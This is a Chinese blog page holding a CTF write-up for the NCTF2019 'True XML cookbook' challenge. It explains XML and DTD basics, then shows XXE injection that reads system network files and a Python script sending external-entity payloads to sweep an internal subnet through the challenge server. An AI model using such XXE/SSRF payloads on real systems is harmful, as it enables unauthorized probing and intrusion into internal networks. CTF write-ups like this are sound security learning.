@@ -1,0 +1,246 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>[NCTF2019]True XML cookbook | why</title>
+    <meta name="author" content="why" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>WHY</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;WHY</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>[NCTF2019]True XML cookbook</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/5/30
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240530221915999.png" alt="image-20240530221915999"></p>
+<p>要长脑子了好像在哪里见过</p>
+<p>孩子们我回来了是吧</p>
+<p>好好好</p>
+<p>和上一题差不多的话先抓包</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240530222006950.png" alt="image-20240530222006950"></p>
+<p>之后是实体化注入</p>
+<h4 id="实体化注入"><a href="#实体化注入" class="headerlink" title="实体化注入"></a>实体化注入</h4><p>XXE(XML External Entity Injection)全称为XML外部实体注入。</p>
+<p>XML是什么？<br>XML指可扩展标记语言(EXtensible Markup Language),其设计宗旨是传输数据，而不是显示数据，用来结构化、存储以及传输信息，它没有预定义的标签。XML 和 HTML 之间的差异是什么？</p>
+<p>设计目的不同：XML 被设计用来传输和存储数据，其焦点是数据的内容。HTML 被设计用来显示数据，其焦点是数据的外观。HTML 旨在显示信息，而 XML 旨在传输信息。</p>
+<p>总的来说：我们希望能在计算机中保存和处理这些数据的同时能够保存和处理他们之间的关系。XML就是为了解决这样的需求而产生数据存储格式。</p>
+<p>XML基本格式与基本语法：<br>基本格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;               &lt;!--xml文件的声明--&gt;</span><br><span class="line"></span><br><span class="line">&lt;bookstore&gt;                                                                                          &lt;!--根元素--&gt;</span><br><span class="line"></span><br><span class="line">&lt;book category=&quot;COOKING&quot;&gt;                             &lt;!--bookstore的子元素，category为属性--&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;Everyday Italian&lt;/title&gt;                                &lt;!--book的子元素，lang为属性--&gt;</span><br><span class="line"></span><br><span class="line">&lt;author&gt;Giada De Laurentiis&lt;/author&gt;                 &lt;!--book的子元素--&gt;</span><br><span class="line"></span><br><span class="line">&lt;year&gt;2005&lt;/year&gt;                                               &lt;!--book的子元素--&gt;</span><br><span class="line"></span><br><span class="line">&lt;price&gt;30.00&lt;/price&gt;                                             &lt;!--book的子元素--&gt;</span><br><span class="line"></span><br><span class="line">&lt;/book&gt;                                                                  &lt;!--book的结束--&gt;</span><br><span class="line"></span><br><span class="line">&lt;/bookstore&gt;                                                          &lt;!--bookstore的结束--&gt;</span><br></pre></td></tr></table></figure>
+
+ <?xml version="1.0" encoding="UTF-8" standalone="yes"?><p> 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。</p>
+<p>standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。</p>
+<p>基本语法：<br>所有 XML 元素都须有关闭标签。<br>XML 标签对大小写敏感。<br>XML 必须正确地嵌套。<br>XML 文档必须有根元素。<br>XML 的属性值须加引号。<br> 什么是DTO？<br>DTD基本概念<br>XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的。<br>DTD用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。是XML文档中的几条语句，用来说明哪些元素&#x2F;属性是合法的以及元素间应当怎样嵌套&#x2F;结合，也用来将一些特殊字符和可复用代码段自定义为实体。</p>
+<p>实体引用<br>XML元素以形如 <tag>foo</tag> 的标签开始和结束，如果元素内部出现如&lt; 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义五个实体引用，即用&lt; &gt; &amp; &apos; &quot; 替换 &lt; &gt; &amp; ‘ “ 。<br>实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行。</p>
+<p>这道题就不从错误尝试开始了</p>
+<p>直接从正解开始吧</p>
+<p>探测内网信息，读取下系统内的配置文件信息看是否能发现有用的信息，包含：&#x2F;etc&#x2F;hosts、&#x2F;proc&#x2F;net&#x2F;arp、proc&#x2F;net&#x2F;fib_trie等</p>
+<p>我们读取关键文件：</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240530222507318.png" alt="image-20240530222507318"></p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240530222516481.png" alt="image-20240530222516481"></p>
+<p>对80.后面的174三位进行爆破</p>
+<p>即查询下同网段内存在不存在其他地址</p>
+<p>爆破脚本如下（因为我bp用不来）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests as res</span><br><span class="line">url=&quot;http://46a0cc5d-9c92-4497-b08a-7b24717759ad.node5.buuoj.cn:81/doLogin.php&quot;</span><br><span class="line">rawPayload=&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&#x27;\</span><br><span class="line">         &#x27;&lt;!DOCTYPE user [&#x27;\</span><br><span class="line">         &#x27;&lt;!ENTITY payload1 SYSTEM &quot;http://10.244.80.&#123;&#125;&quot;&gt;&#x27;\</span><br><span class="line">         &#x27;]&gt;&#x27;\</span><br><span class="line">         &#x27;&lt;user&gt;&#x27;\</span><br><span class="line">         &#x27;&lt;username&gt;&#x27;\</span><br><span class="line">         &#x27;&amp;payload1;&#x27;\</span><br><span class="line">         &#x27;&lt;/username&gt;&#x27;\</span><br><span class="line">         &#x27;&lt;password&gt;&#x27;\</span><br><span class="line">         &#x27;23&#x27;\</span><br><span class="line">         &#x27;&lt;/password&gt;&#x27;\</span><br><span class="line">         &#x27;&lt;/user&gt;&#x27;</span><br><span class="line">for i in range(1,256):</span><br><span class="line">    payload=rawPayload.format(i)</span><br><span class="line">    #payload=rawPayload</span><br><span class="line">    print(str(&quot;#&#123;&#125; =&gt;&quot;).format(i),end=&#x27;&#x27;)</span><br><span class="line">    try:</span><br><span class="line">        resp=res.post(url,data=payload,timeout=0.5)</span><br><span class="line">    except:</span><br><span class="line">        continue</span><br><span class="line">    else:</span><br><span class="line">        print(resp.text,end=&#x27;&#x27;)</span><br><span class="line">    finally:</span><br><span class="line">        print(&#x27;&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>最后找到网址和flag！</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 why
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;why
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+<script src="/js/<file>"></script>
+<link rel="stylesheet" href="/css/<file>" />
+</body>
+</html>
